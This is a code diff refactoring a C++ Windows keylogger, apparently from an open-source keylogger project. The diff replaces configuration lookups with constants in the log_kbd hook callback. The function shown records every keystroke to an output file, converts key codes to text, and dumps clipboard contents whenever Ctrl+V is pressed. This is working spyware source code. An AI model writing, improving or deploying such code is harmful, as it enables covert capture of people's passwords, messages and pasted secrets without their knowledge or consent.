@@ -1,7 +1,7 @@
 #include "keylogger.h"
 #include "keyboard.h"
 #include "configuration.h"
-#include <cstdint>
+#include "constants.h"
 
 void keylogger::log_kbd(const KBDLLHOOKSTRUCT* kbd_hook)
 {
@@ -11,9 +11,9 @@ void keylogger::log_kbd(const KBDLLHOOKSTRUCT* kbd_hook)
     {
         out_file << configuration::key_codes.at(kbd_hook->vkCode);
     }
-    else if (keyboard::is_control_down())
+    else if (keyboard::is_down(VK_CONTROL))
     {
-        if (kbd_hook->vkCode == configuration::virtual_key_v)
+        if (kbd_hook->vkCode == VK_V)
         {
             write_clipboard_data(out_file);
         }
@@ -24,11 +24,11 @@ void keylogger::log_kbd(const KBDLLHOOKSTRUCT* kbd_hook)
     }
     else
     {
-        BYTE state[configuration::keyboard_state_size];
+        BYTE state[KEYBOARD_STATE_SIZE];
         keyboard::get_state(state);
 
-        WCHAR key_buffer[configuration::key_buffer_size];
-        const auto result = ToUnicode(kbd_hook->vkCode, kbd_hook->scanCode, state, key_buffer, configuration::key_buffer_size, 0);
+        WCHAR key_buffer[PWSZ_BUFFER_SIZE];
+        const auto result = ToUnicode(kbd_hook->vkCode, kbd_hook->scanCode, state, key_buffer, PWSZ_BUFFER_SIZE, 0);
 
         if (result > 0) out_file << key_buffer;
     }
